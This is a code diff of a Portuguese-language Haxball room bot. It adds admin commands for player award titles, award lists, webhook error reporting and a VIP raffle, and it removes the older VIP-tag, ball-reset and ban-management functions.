     var msgArray = message.split(/ +/).slice(1);
@@ -6144,6 +1718,182 @@ function setPuskasCommand(player, message) {
         } else {
             room.sendAnnouncement(
                 `Número incorreto de argumentos. Digite "!ajuda setpuskas" para obter mais informações.`,
+                player.id,
+                errorColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+        }
+    }
+}
+
+function setBuskasCommand(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray.length > 0) {
+        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
+            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
+            if (room.getPlayer(parseInt(msgArray[0])) != null) {
+                var playerBuskas = room.getPlayer(parseInt(msgArray[0]))
+
+                var resSetBuskas = false
+                if (buskas[authArray[playerBuskas.id]]) {
+                    resSetBuskas = true
+                }
+
+                if (!resSetBuskas) {
+                    buskas[authArray[playerBuskas.id]] =
+                    {
+                        name: playerBuskas.name,
+                        auth: authArray[playerBuskas.id]
+                    }
+                    room.sendAnnouncement(`${playerBuskas.name} agora é um jogador Buskás!`, null, announcementColor, 'bold', 3);
+                } else {
+                    delete buskas[authArray[playerBuskas.id]]
+                    room.sendAnnouncement(`${playerBuskas.name} não é mais um jogador Buskás!`, null, announcementColor, 'bold', 3);
+                }
+            } else {
+                room.sendAnnouncement(
+                    `Formato incorreto para seu argumento. Digite "!ajuda setbuskas" para obter mais informações.`,
+                    player.id,
+                    errorColor,
+                    'bold',
+                    HaxNotification.CHAT)
+            }
+        } else {
+            room.sendAnnouncement(
+                `Número incorreto de argumentos. Digite "!ajuda setbuskas" para obter mais informações.`,
+                player.id,
+                errorColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+        }
+    }
+}
+
+function setChuteiraCommand(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray.length > 0) {
+        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
+            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
+            if (room.getPlayer(parseInt(msgArray[0])) != null) {
+                var playerBuskas = room.getPlayer(parseInt(msgArray[0]))
+
+                var resSetBuskas = false
+                if (chuteira[authArray[playerBuskas.id]]) {
+                    resSetBuskas = true
+                }
+
+                if (!resSetBuskas) {
+                    chuteira[authArray[playerBuskas.id]] =
+                    {
+                        name: playerBuskas.name,
+                        auth: authArray[playerBuskas.id]
+                    }
+                    room.sendAnnouncement(`${playerBuskas.name} agora é um jogador Chuteira de ouro!`, null, announcementColor, 'bold', 3);
+                } else {
+                    delete chuteira[authArray[playerBuskas.id]]
+                    room.sendAnnouncement(`${playerBuskas.name} não é mais um jogador Chuteira de ouro!`, null, announcementColor, 'bold', 3);
+                }
+            } else {
+                room.sendAnnouncement(
+                    `Formato incorreto para seu argumento. Digite "!ajuda setchuteira" para obter mais informações.`,
+                    player.id,
+                    errorColor,
+                    'bold',
+                    HaxNotification.CHAT)
+            }
+        } else {
+            room.sendAnnouncement(
+                `Número incorreto de argumentos. Digite "!ajuda setchuteira" para obter mais informações.`,
+                player.id,
+                errorColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+        }
+    }
+}
+
+function setLuvaCommand(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray.length > 0) {
+        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
+            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
+            if (room.getPlayer(parseInt(msgArray[0])) != null) {
+                var playerBuskas = room.getPlayer(parseInt(msgArray[0]))
+
+                var resSetBuskas = false
+                if (luva[authArray[playerBuskas.id]]) {
+                    resSetBuskas = true
+                }
+
+                if (!resSetBuskas) {
+                    luva[authArray[playerBuskas.id]] =
+                    {
+                        name: playerBuskas.name,
+                        auth: authArray[playerBuskas.id]
+                    }
+                    room.sendAnnouncement(`${playerBuskas.name} agora é um jogador Luva de ouro!`, null, announcementColor, 'bold', 3);
+                } else {
+                    delete luva[authArray[playerBuskas.id]]
+                    room.sendAnnouncement(`${playerBuskas.name} não é mais um jogador Luva de ouro!`, null, announcementColor, 'bold', 3);
+                }
+            } else {
+                room.sendAnnouncement(
+                    `Formato incorreto para seu argumento. Digite "!ajuda setluva" para obter mais informações.`,
+                    player.id,
+                    errorColor,
+                    'bold',
+                    HaxNotification.CHAT)
+            }
+        } else {
+            room.sendAnnouncement(
+                `Número incorreto de argumentos. Digite "!ajuda setchuteira" para obter mais informações.`,
+                player.id,
+                errorColor,
+                'bold',
+                HaxNotification.CHAT
+            );
+        }
+    }
+}
+
+function setGarcomCommand(player, message) {
+    var msgArray = message.split(/ +/).slice(1);
+    if (msgArray.length > 0) {
+        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
+            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
+            if (room.getPlayer(parseInt(msgArray[0])) != null) {
+                var playerBuskas = room.getPlayer(parseInt(msgArray[0]))
+
+                var resSetBuskas = false
+                if (garcom[authArray[playerBuskas.id]]) {
+                    resSetBuskas = true
+                }
+
+                if (!resSetBuskas) {
+                    garcom[authArray[playerBuskas.id]] =
+                    {
+                        name: playerBuskas.name,
+                        auth: authArray[playerBuskas.id]
+                    }
+                    room.sendAnnouncement(`${playerBuskas.name} agora é um jogador Garçom!`, null, announcementColor, 'bold', 3);
+                } else {
+                    delete garcom[authArray[playerBuskas.id]]
+                    room.sendAnnouncement(`${playerBuskas.name} não é mais um jogador Garçom!`, null, announcementColor, 'bold', 3);
+                }
+            } else {
+                room.sendAnnouncement(
+                    `Formato incorreto para seu argumento. Digite "!ajuda setgarcom" para obter mais informações.`,
+                    player.id,
+                    errorColor,
+                    'bold',
+                    HaxNotification.CHAT)
+            }
+        } else {
+            room.sendAnnouncement(
+                `Número incorreto de argumentos. Digite "!ajuda setgarcom" para obter mais informações.`,
                 player.id,
                 errorColor,
                 'bold',
@@ -6198,275 +1948,83 @@ function setGoldBallCommand(player, message) {
     }
 }
 
-
-
-async function setNewTag(player, message) {
-    var msgArray = message.split(/ +/).slice(1);
-    if (msgArray.length > 0) {
-        if (msgArray[0].length > 0 && msgArray[0][0] == '#') {
-            var numVip = msgArray[1]
-            msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
-            if (room.getPlayer(parseInt(msgArray[0])) != null && numVip != null) {
-                var playerVip = room.getPlayer(parseInt(msgArray[0]))
-                if (numVip == 5) {
-                    var resSetVip = false
-                    if (vips[authArray[playerVip.id]]) {
-                        resSetVip = true
-                    }
-                    if (!resSetVip) {
-                        vips[authArray[playerVip.id]] =
-                        {
-                            name: playerVip.name,
-                            auth: authArray[playerVip.id],
-                            tipoVip: 5,
-                            corChat: "",
-                            fonte: 0,
-                            pausarJogoOFF: false,
-                            furarFila: false,
-                            provos: {},
-                            unis: {},
-                            avatarGol: [],
-                            msgEntrada: ''
-                        }
-                        room.sendAnnouncement(`${playerVip.name} agora é VIP!`,
-                            null, announcementColor, 'bold', HaxNotification.CHAT)
-                        vip1Password = getRandomInt2(10000, 99999)
-                        sendPasswordVip()
-                    } else {
-                        delete vips[authArray[playerVip.id]]
-                        room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
-                            null, announcementColor, 'bold', HaxNotification.CHAT)
-                    }
-                } else if (numVip == 6) {
-                    var resSetVip = false
-                    if (vips[authArray[playerVip.id]]) {
-                        resSetVip = true
-                    }
-                    if (!resSetVip) {
-                        vips[authArray[playerVip.id]] =
-                        {
-                            name: playerVip.name,
-                            auth: authArray[playerVip.id],
-                            tipoVip: 2,
-                            corChat: "",
-                            fonte: 0,
-                            pausarJogoOFF: false,
-                            furarFila: true,
-                            provos: {},
-                            unis: {},
-                            avatarGol: [],
-                            msgEntrada: ''
-                        }
-                        room.sendAnnouncement(
-                            `${playerVip.name} agora é VIP!`,
-                            null,
-                            announcementColor,
-                            'bold',
-                            HaxNotification.CHAT)
-                        vip2Password = getRandomInt2(100000, 199999)
-                        sendPasswordVip()
-                    } else {
-                        delete vips[authArray[playerVip.id]]
-                        room.sendAnnouncement(`${playerVip.name} não é mais VIP!`,
-                            null, announcementColor, 'bold', HaxNotification.CHAT)
-                    }
-                } else {
-                    room.sendAnnouncement(
-                        `Não há jogador com tal ID na sala. Digite "!ajuda settag" para obter mais informações.`,
-                        player.id,
-                        errorColor,
-                        'bold',
-                        HaxNotification.CHAT)
-                }
-            } else {
-                room.sendAnnouncement(
-                    `Formato incorreto para seu argumento. Digite "!ajuda settag" para obter mais informações.`,
-                    player.id,
-                    errorColor,
-                    'bold',
-                    HaxNotification.CHAT)
-            }
-        } else {
-            room.sendAnnouncement(
-                `Número incorreto de argumentos. Digite "!ajuda settag" para obter mais informações.`,
-                player.id,
-                errorColor,
-                'bold',
-                HaxNotification.CHAT
-            );
-        }
-    }
-}
-
-// LOCALIZAÇÃO DA BOLA
-function rr2Command(player, message) {
-    room.pauseGame(true);
-    room.sendAnnouncement(`Mudando a localização dos jogadores...`, null, errorColor, 'bold', HaxNotification.CHAT);
-
-    for (let i = 0; i < teamRed.length; i++) {
-        let playerId = teamRed[i].id;
-        let newPosition = { x: -350, y: 0 };
-
-        room.setPlayerDiscProperties(playerId, newPosition);
-    }
-
-    room.setDiscProperties(0, { x: 0, y: 0 });
-
-    for (let i = 0; i < teamBlue.length; i++) {
-        let playerId = teamBlue[i].id;
-        let newPosition = { x: 350, y: 0 };
-
-        room.setPlayerDiscProperties(playerId, newPosition);
-    }
-
-
-    room.pauseGame(false);
-    room.sendAnnouncement(`Localização resetada ✔`, null, successColor, 'bold', HaxNotification.CHAT);
-
-    return false;
-}
-
-
-/* GAME */
-
-var lastTouches = Array(2).fill(null);
-var lastTeamTouched;
-
-var speedCoefficient = 100 / (5 * (0.99 ** 60 + 1));
-var ballSpeed = 0;
-var playerRadius = 15;
-var ballRadius = 10;
-var triggerDistance = playerRadius + ballRadius + 0.01; // Bot desenvolvido pelo OBL
-
-/* COLORS */
-
-var welcomeColor = 0xc4ff65;
-var announcementColor = 0xffefd6//0xAA00FF;
-var infoColor = 0xbebebe//0x76FF03;
-var privateMessageColor = 0xffc933;
-var redColor = 0xff4c4c;
-var blueColor = 0x62cbff;
-var warningColor = 0xffa135;
-var errorColor = 0xFA5646
-var successColor = 0x75ff75;
-var defaultColor = null;
-
-/* AUXILIARY */
-
-var checkTimeVariable = false; // Bot desenvolvido pelo OBL
-var checkStadiumVariable = true;
-var endGameVariable = false;
-var cancelGameVariable = false;
-var kickFetchVariable = false;
-
-var chooseMode = false;
-var timeOutCap;
-var capLeft = false;
-var redCaptainChoice = '';
-var blueCaptainChoice = '';
-var chooseTime = 20;
-
-var AFKSet = new Set();
-var AFKMinSet = new Set();
-var AFKCooldownSet = new Set();
-var minAFKDuration = 0;
-var maxAFKDuration = 10;
-var AFKCooldown = 0;
-
-var muteArray = new MuteList();
-var muteDuration = 5;
-
-var removingPlayers = false;
-var insertingPlayers = false;
-
-var stopTimeout;
-var startTimeout;
-var unpauseTimeout;
-var removingTimeout;
-var insertingTimeout;
-
-var emptyPlayer = {
-    id: 0, // Bot desenvolvido pelo OBL
-};
-stadiumCommand(emptyPlayer, "!map1");
-
-var game = new Game();
-
-/* FUNCTIONS */
-
-
-// ----------------------------------------
-
-async function error(erro, command) {
-    if (command == '') {
-        console.error(`Erro: ` + erro);
-
-        if (urls.errorsWebhook != "") {
-            await fetch(urls.errorsWebhook, {
-                method: 'POST',
-                body: JSON.stringify({
-                    content: `Ocorreu um erro: \n\n **\`\`\`${erro}\`\`\`**`,
-                    username: roomName,
-                }),
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-            }).then((res) => res);
-        }
+function showPuskas(player, message) {
+    let i = 1
+    let puskasNames = ""
+    if (puskas.length > 0) {
+        puskas.forEach(function (item) {
+            puskasNames += item.name + '[' + i + '], '
+            i++
+        })
+        room.sendAnnouncement(`Lista de jogadores Puskás:\n` + puskasNames,
+            player.id, announcementColor, 'bold', null)
     } else {
-        console.error(`Erro no comando ${command}: ` + erro);
-
-        if (urls.errorsWebhook != "") {
-            await fetch(urls.errorsWebhook, {
-                method: 'POST',
-                body: JSON.stringify({
-                    content: `Ocorreu um erro no comando ${command}: \n\n **\`\`\`${erro}\`\`\`**`,
-                    username: roomName,
-                }),
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-            }).then((res) => res);
-        }
+        room.sendAnnouncement(`Lista de jogadores Puskás Vazia!`,
+            player.id, announcementColor, 'bold', null)
     }
 }
 
-async function procurarMotivo(player, message) {
-    var msgArray = message.split(/ +/).slice(1);
-
-    function buscarMotivoPorNome(nome) {
-        for (var i = 0; i < banList.length; i++) { // Bot desenvolvido pelo OBL
-            if (banList[i].nome === nome) {
-                room.sendAnnouncement(`- Motivo: ${banList[i].motivo}`, player.id, cores.verde, 'bold', 2);
-                room.sendAnnouncement(`- Banido pelo(a): ${banList[i].admin} (AdminID: ${banList[i].adminId})`, player.id, cores.verde, 'bold');
-                room.sendAnnouncement(`- Data do banimento: ${banList[i].init}`, player.id, cores.verde, 'bold');
-                room.sendAnnouncement(`- Banimento acaba em: ${banList[i].tempo}`, player.id, cores.verde, 'bold', 2);
-                return false;
-            }
-        }
-        return room.sendAnnouncement(`Usuário não encontrado ou não está banido. (tente procurar pelo id: !motivo id <id>)`, player.id, errorColor, 'bold', 2);
-    }
-
-    function buscarMotivoPorId(id) {
-        for (var i = 0; i < banList.length; i++) {
-            if (banList[i].id === id) {
-                room.sendAnnouncement(`- Motivo: ${banList[i].motivo}`, player.id, cores.verde, 'bold', 2);
-                room.sendAnnouncement(`- Banido pelo(a): ${banList[i].admin} (AdminID: ${banList[i].adminId})`, player.id, cores.verde, 'bold');
-                room.sendAnnouncement(`- Data do banimento: ${banList[i].init}`, player.id, cores.verde, 'bold');
-                room.sendAnnouncement(`- Banimento acaba em: ${banList[i].tempo}`, player.id, cores.verde, 'bold', 2);
-                return false;
-            }
-        }
-        return room.sendAnnouncement(`Usuário não encontrado ou não está banido. (tente procurar pelo nome: !motivo nome <nome>)`, player.id, errorColor, 'bold', 2);
-    }
-
-    if (msgArray[0] == 'nome') {
-        buscarMotivoPorNome(msgArray[1]);
-    } else if (msgArray[0] == 'id') {
-        buscarMotivoPorId(msgArray[1]);
+function showBuskas(player, message) {
+    let i = 1
+    let buskasNames = ""
+    if (buskas.length > 0) {
+        buskas.forEach(function (item) {
+            buskasNames += item.name + '[' + i + '], '
+            i++
+        })
+        room.sendAnnouncement(`Lista de jogadores Buskás:\n` + buskasNames,
+            player.id, announcementColor, 'bold', null)
     } else {
-        room.sendAnnouncement(`Você digitou o comando  de forma errada!`, player.id, errorColor, 'bold', 3);
-        return false;
+        room.sendAnnouncement(`Lista de jogadores Buskás Vazia!`,
+            player.id, announcementColor, 'bold', null)
+    }
+}
+
+function showGarcons(player, message) {
+    let i = 1
+    let buskasNames = ""
+    if (garcom.length > 0) {
+        garcom.forEach(function (item) {
+            buskasNames += item.name + '[' + i + '], '
+            i++
+        })
+        room.sendAnnouncement(`Lista de jogadores Garçons:\n` + buskasNames,
+            player.id, announcementColor, 'bold', null)
+    } else {
+        room.sendAnnouncement(`Lista de jogadores Garçons Vazia!`,
+            player.id, announcementColor, 'bold', null)
+    }
+}
+
+function showLuvas(player, message) {
+    let i = 1
+    let buskasNames = ""
+    if (luva.length > 0) {
+        luva.forEach(function (item) {
+            buskasNames += item.name + '[' + i + '], '
+            i++
+        })
+        room.sendAnnouncement(`Lista de jogadores Luvas de ouro:\n` + buskasNames,
+            player.id, announcementColor, 'bold', null)
+    } else {
+        room.sendAnnouncement(`Lista de jogadores Luvas de ouro Vazia!`,
+            player.id, announcementColor, 'bold', null)
+    }
+}
+
+function showChuteiras(player, message) {
+    let i = 1
+    let buskasNames = ""
+    if (chuteira.length > 0) {
+        chuteira.forEach(function (item) {
+            buskasNames += item.name + '[' + i + '], '
+            i++
+        })
+        room.sendAnnouncement(`Lista de jogadores Chuteira de ouro:\n` + buskasNames,
+            player.id, announcementColor, 'bold', null)
+    } else {
+        room.sendAnnouncement(`Lista de jogadores Chuteira de ouro Vazia!`,
+            player.id, announcementColor, 'bold', null)
     }
 }
 
@@ -6502,258 +2060,259 @@ async function sendFetch(message, arg1, arg2, arg3) {
     }).then((res) => res)
 }
 
-function parseBanTime(timeString) {
-    var parts = timeString.split(" ");
-    var value = parseInt(parts[0]);
-    var unit = parts[parts.length - 1].toLowerCase();
-
-    switch (unit) {
-        case "dia":
-        case "days":
-        case "dias":
-            return value * 24 * 60 * 60 * 1000;
-        case "mes":
-        case "mesês":
-        case "meses":
-            return value * 30 * 24 * 60 * 60 * 1000;
-        case "hora":
-        case "hor":
-        case "hour":
-        case "horas":
-            return value * 60 * 60 * 1000;
-        case "min":
-        case "minuto":
-        case "minutos":
-            return value * 60 * 1000;
-        case "permanente":
-        case "perma":
-        case "perm":
-            return Infinity;
-        default:
-            return 0;
+async function error(erro, command) {
+    if (command == '') {
+        command = `Nenhum`;
     }
+
+    console.error(`Erro no comando ${command}:` + erro);
+
+    await fetch(errorsWebhook, {
+        method: 'POST',
+        body: JSON.stringify({
+            content: `Ocorreu um erro no comando ${command}: \n\n **\`\`\`${erro}\`\`\`**`,
+            username: roomName,
+        }),
+        headers: {
+            'Content-Type': 'application/json',
+        },
+    }).then((res) => res);
 }
 
-function removeExpiredBans() {
-    var currentTime = new Date();
 
-    for (var i = banList.length - 1; i >= 0; i--) {
-        var user = banList[i];
-        var banTime = parseBanTime(user.tempo);
-        var banEndTime = new Date(user.init.getTime() + banTime); // Calcula o tempo de término do banimento
 
-        if (currentTime >= banEndTime) {
-            banList.splice(i, 1); // Remove o usuário da lista
-            room.sendAnnouncement(`O ${user.nome} foi desbanido!`, null, errorColor, 'bold', 3);
-        }
-    }
-}
+async function sorteio(player, message) {
+    var playersJogando = room.getPlayerList().filter(p => p.team !== 0);
+    var winner = [];
 
-async function banCommand(player, message) {
-    try {
-        if (masterList.includes(authArray[player.id]) || adminList.includes(authArray[player.id]) || mods.includes(authArray[player.id])) {
-            const playerList = room.getPlayerList();
+    if (!sorteioIniciado) {
+        if (
+            masterList.includes(authArray[player.id]) ||
+            donoList.includes(authArray[player.id]) ||
+            diretores.includes(authArray[player.id]) ||
+            gerentes.includes(authArray[player.id])
+        ) {
+            if (playersJogando.length >= 1) {
+                var currentDate = new Date().toLocaleDateString();
 
-            var modoBan = '';
-            var msgArray = message.split(/ +/);
-            var motivo = msgArray[2];
-
-            var tempo1 = msgArray[3];
-            var tempo2 = msgArray[4];
-            //var novaPalavra = palavra[0] + " " + palavra.substring(1);
-            var tempo = `${tempo1} ${tempo2}`;
-
-            if (tempo1 == null || tempo2 == null || tempo1 == undefined || tempo2 == undefined || tempo1 == 'undefined' || tempo2 == 'undefined') {
-                tempo = 'permanente';
-            }
-
-            if (!isNaN(motivo)) {
-                room.sendAnnouncement(`[PV] O motivo deve ser um texto.`, player.id, errorColor, 'bold', 2);
-                return false;
-            } /* else if (motivo.length < 5) {
-                room.sendAnnouncement(`[PV] O motivo deve ter mais de 5 caracteres!`, player.id, errorColor, 'bold', 2);
-                return false;
-            } */
-
-            if (msgArray[1].startsWith("#") || !isNaN(msgArray[1])) {
-                try {
-                    var userId;
-                    var playerName = 'Nenhum';
-                    var filteredPlayers = room.getPlayerList().filter(p => p.id === userId);
-
-                    if (msgArray[1].startsWith("#")) {
-                        userId = parseInt(msgArray[1].replace(/#/g, ''));
-                    } else {
-                        userId = parseInt(msgArray[1]);
-                    }
-
-                    var targetPlayerExists = playerList.some(player => player.id === userId);
-                    var ownerCommand = playerList.filter(p => p.id === userId);
-
-                    if (!targetPlayerExists) {
-                        room.sendAnnouncement(`[PV] Não encontrei nenhum registro desse jogador.`, player.id, errorColor, 'bold', 2);
-                        return false;
-                    }
-
-                    if (player.id === ownerCommand[0].id) {
-                        room.sendAnnouncement(`[PV] Você não pode banir você mesmo.`, player.id, errorColor, 'bold', 2);
-                        return false;
-                    }
-
-                    var isIdIncluded = banList.some(function (jogador) {
-                        return jogador.id === userId;
-                    });
-
-                    for (var i = 0; i < banList.length; i++) {
-                        if (banList[i].id === userId) {
-                            playerName = banList[i].nome;
-                            break;
-                        }
-                    }
-
-                    if (isIdIncluded) {
-                        if (playerName !== 'Nenhum') {
-                            room.sendAnnouncement(`[PV] O ${playerName} já está banido.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
-                            return false;
-                        } else {
-                            room.sendAnnouncement(`[PV] Este jogador já está banido.`, player.id, errorColor, 'bold', HaxNotification.CHAT);
-                            return false;
-                        }
-                    } else {
-                        for (var indice in jogadoresRoom) {
-                            if (jogadoresRoom.hasOwnProperty(indice)) {
-                                var jogador = jogadoresRoom[indice];
-
-                                if (jogador.id === userId) {
-                                    var nomeDoJogador = jogador.nome;
-                                    var connDoJogador = jogador.conn;
-                                    var authDoJogador = jogador.auth;
-                                    var ipv4DoJogador = jogador.ipv4;
-
-                                    var bannedUser = {
-                                        nome: nomeDoJogador,
-                                        id: userId,
-                                        conn: connDoJogador,
-                                        auth: authDoJogador,
-                                        ipv4: ipv4DoJogador,
-                                        motivo: motivo,
-                                        init: new Date(),
-                                        admin: player.name,
-                                        adminId: player.id,
-                                        tempo: tempo,
-                                    };
-
-                                    banList.push(bannedUser);
-
-                                    room.kickPlayer(userId, motivo, true);
-
-                                    room.sendAnnouncement(`O ${nomeDoJogador} foi banido pelo(a) ${player.name}.`, null, cores.vermelho, 'italic', 3);
-                                    room.sendAnnouncement(`- Motivo: ${motivo}`, null, cores.vermelho, 'italic');
-                                    room.sendAnnouncement(`- Tempo do banimento: ${tempo}`, null, cores.vermelho, 'italic');
-                                    room.sendAnnouncement(`[PV] O ${nomeDoJogador} foi banido com sucesso!`, player.id, cores.verde, 'bold', 2);
-
-                                    fetch(URLs.banLogs, {
-                                        method: 'POST',
-                                        body: JSON.stringify({
-                                            content: `O ${nomeDoJogador} foi banido por ${tempo}!\n\n*Informações:*\n\n> - ID: ${id}\n> - Motivo: ${motivo}\n> - Conn: ${connDoJogador}\n> - Auth: ${authDoJogador}\n> IPV4 - ${ipv4}\n> - Admin: ${player.name}\n> - Tempo: ${tempo}\n> -`,
-                                            username: roomName,
-                                        }),
-                                        headers: {
-                                            'Content-Type': 'application/json',
-                                        },
-                                    }).then((res) => res);
-
-                                    fetch(URLs.punicoes, {
-                                        method: 'POST',
-                                        body: JSON.stringify({
-                                            content: `> - **Nick:** ${nomeDoJogador}\n> - **Motivo:** ${motivo}\n> - **Tempo:** ${tempo}\n> - **Sala do banimento:** ${roomName}\n\n- **Banido pelo(a):** ${player.name}`,
-                                            username: roomName,
-                                        }),
-                                        headers: {
-                                            'Content-Type': 'application/json',
-                                        },
-                                    }).then((res) => res);
-
-                                    fetch(URLs.punicoes, {
-                                        method: 'POST',
-                                        body: JSON.stringify({
-                                            content: traco,
-                                            username: roomName,
-                                        }),
-                                        headers: {
-                                            'Content-Type': 'application/json',
-                                        },
-                                    }).then((res) => res);
-
-                                    break;
-                                }
-                            }
-                        }
-                    }
-                } catch (err) {
-                    error(err);
+                if (currentDate !== lastExecutedDate) {
+                    daysSorteios = 0;
+                    lastExecutedDate = currentDate;
                 }
-            } else if (["ip", "ipv4"].includes(msgArray[1].toLowerCase())) {
-                modoBan = "ipv4";
 
-                if (!/^\d+\.\d+\.\d+\.\d+$/.test(msgArray[2])) {
-                    room.sendAnnouncement("Você não especificou o IP corretamente...", player.id, errorColor, 'bold', HaxNotification.MENTION);
-                    return false;
+                if (daysSorteios >= maxSorteios) {
+                    room.sendAnnouncement(
+                        `${player.name} O limite de sorteios para hoje já foi atingido. Tente novamente amanhã.`,
+                        null,
+                        cores.azul,
+                        'bold'
+                    );
                 } else {
-                    addIpToBanList(msgArray[2])
+                    daysSorteios++;
 
-                    var sendDiscordBan = `O Administrador ${player.name} baniu o IPV4: **${msgArray[2]}**`;
-                    var ipv4 = msgArray[2];
+                    var msgArray = message.split(/ +/);
+                    var filteredPlayers = room.getPlayerList();
+                    var randomIndex = Math.floor(Math.random() * filteredPlayers.length);
+                    var randomPlayer = filteredPlayers[randomIndex];
 
-                    room.sendAnnouncement(`[PV] IPV4 Banido com sucesso: ${msgArray[2]}`, player.id, cores.verde, 'bold', HaxNotification.MENTION);
+                    winner = [
+                        {
+                            nome: randomPlayer.name,
+                            id: randomPlayer.id,
+                        },
+                    ];
 
-                    sendFetch(sendDiscordBan);
-                    return false;
+                    var winName = winner[0].nome;
+                    var winId = winner[0].id;
+
+                    var numVip = 1;
+                    var resSetVip = false;
+
+                    if (!isNaN(parseInt(numVip))) {
+                        sorteioIniciado = true;
+                        room.sendAnnouncement(
+                            `[PV] ${player.name} Iniciando o sorteio...`,
+                            player.id,
+                            cores.azul,
+                            'bold'
+                        );
+
+                        room.sendAnnouncement('', null, cores.vermelho, 'bold', 3);
+                        room.sendAnnouncement('', null, cores.vermelho, 'bold', 3);
+                        room.sendAnnouncement('', null, cores.vermelho, 'bold', 3);
+                        room.sendAnnouncement('', null, cores.vermelho, 'bold', 3);
+                        room.sendAnnouncement(traco, null, cores.preto, 'bold', 3);
+                        setTimeout(() => {
+                            room.sendAnnouncement(
+                                `O admin ${player.name} iniciou o sorteio!`,
+                                null,
+                                cores.verde,
+                                'bold',
+                                2
+                            );
+                            room.sendAnnouncement(`O Ganhador foi...`, null, cores.verde, 'bold', 1);
+                            setTimeout(() => {
+                                room.sendAnnouncement(
+                                    winner[0].nome +
+                                    ` Parabéns!! seu prêmio será entregue em alguns segundos, aguarde...`,
+                                    null,
+                                    cores.ouro,
+                                    'bold',
+                                    HaxNotification.CHAT
+                                );
+                                room.sendAnnouncement(traco, null, cores.preto, 'bold', HaxNotification.CHAT);
+                                setTimeout(() => {
+                                    sorteioIniciado = false;
+
+                                    msgArray[0] = msgArray[0].substring(1, msgArray[0].length);
+                                    if (winner[0] != null && numVip != null) {
+                                        if (vips[authArray[winId]]) {
+                                            resSetVip = true;
+                                        }
+                                        if (!resSetVip) {
+                                            vips[authArray[winId]] = {
+                                                name: winName,
+                                                id: winId,
+                                                auth: authArray[winId],
+                                                tipoVip: 1,
+                                                corChat: '',
+                                                fonte: 0,
+                                                pausarJogoOFF: false,
+                                                furarFila: false,
+                                                provos: {},
+                                                unis: {},
+                                                avatarGol: [],
+                                                msgEntrada: '',
+                                            };
+                                            room.sendAnnouncement(
+                                                winName +
+                                                ` agora é ${vipNames[1]}!`,
+                                                null,
+                                                announcementColor,
+                                                'bold',
+                                                HaxNotification.CHAT
+                                            );
+                                        } else {
+                                            room.sendAnnouncement(
+                                                'O jogador ' +
+                                                winName +
+                                                ` já é ${vipNames[1]}!`,
+                                                null,
+                                                announcementColor,
+                                                'bold',
+                                                HaxNotification.CHAT
+                                            );
+                                        }
+                                    }
+                                    winner = [];
+                                }, 1000);
+                            }, 2000);
+                        }, 1000);
+
+                        if (urls.allWebhook !== "") {
+                            fetch(urls.allWebhook, {
+                                method: 'POST',
+                                body: JSON.stringify({
+                                    content: `O administrador ${player.name} iniciou um sorteio. \n- Ganhador: \n\`\`\`Nome: ${winName}\`\`\` \n\`\`\`ID: ${winId}\`\`\``,
+                                    username: roomName,
+                                }),
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                            }).then((res) => res)
+                        }
+
+                    } else {
+                        sorteioIniciado = false;
+                        room.sendAnnouncement(
+                            `[PV] ${player.name} Você não especificou o VIP sorteado...`,
+                            player.id,
+                            cores.azul,
+                            'bold'
+                        );
+                        room.sendAnnouncement(`[PV] Vips:`, player.id, cores.branco, 'bold');
+                        room.sendAnnouncement(`[PV] 1 - ${vipNames[1]}`, player.id, cores.cinza, 'bold');
+                        room.sendAnnouncement(`[PV] 2 - ${vipNames[2]}:`, player.id, cores.cinza, 'bold');
+                        room.sendAnnouncement(`[PV] 3 - ${vipNames[3]}:`, player.id, cores.cinza, 'bold');
+                        room.sendAnnouncement(`[PV] 4 - ${vipNames[4]}:`, player.id, cores.cinza, 'bold');
+                        room.sendAnnouncement(
+                            `[PV] Obs: Para iniciar um sorteio digite = !sorteio <id>`,
+                            player.id,
+                            cores.laranja,
+                            'bold'
+                        );
+                    }
                 }
-            } else if (["conn", "connection", "con", "conexao", "conexão"].includes(msgArray[1].toLowerCase())) {
-                modoBan = "conn";
-
-                const conn = msgArray[2];
-                addConnToBanList(conn);
-
-                const sendDiscordBan = `O Administrador ${player.name} baniu a Conn: **${msgArray[2]}**`;
-
-                room.sendAnnouncement(`[PV] Conn Banida com sucesso: ${msgArray[2]}`, player.id, cores.verde, 'bold', HaxNotification.MENTION);
-
-                sendFetch(sendDiscordBan);
-                return false;
-            } else if (["auth"].includes(msgArray[1].toLowerCase())) {
-                modoBan = "auth";
-
-                const auth = msgArray[2];
-                addAuthToBanList(auth);
-
-                const sendDiscordBan = `O Administrador ${player.name} baniu o Auth: **${msgArray[2]}**`;
-
-                room.sendAnnouncement(`[PV] Auth Banido com sucesso: ${msgArray[2]}`, player.id, cores.verde, 'bold', HaxNotification.MENTION);
-
-                sendFetch(sendDiscordBan);
-                return false;
             } else {
-                room.sendAnnouncement(`Você não digitou o comando corretamente...`, player.id, errorColor, 'bold', HaxNotification.MENTION);
-                setTimeout(() => {
-                    room.sendAnnouncement(`Exemplo: !ban <modo> <motivo> <tempo>`, player.id, errorColor, 'bold', HaxNotification.MENTION);
-                    room.sendAnnouncement(`- Tipos de modos: #id, ip, conn, auth,`, player.id, errorColor, 'bold', HaxNotification.MENTION);
-                    room.sendAnnouncement(`!ban #123 racismo 1 dia`, player.id, errorColor, 'bold');
-                }, 1500);
+                room.sendAnnouncement(
+                    `A sala tem ${playersJogando.length} jogador(es), é necessário ter mais de 3 jogador(es)`,
+                    player.id,
+                    errorColor,
+                    'bold',
+                    HaxNotification.MENTION
+                );
                 return false;
-            };
+            }
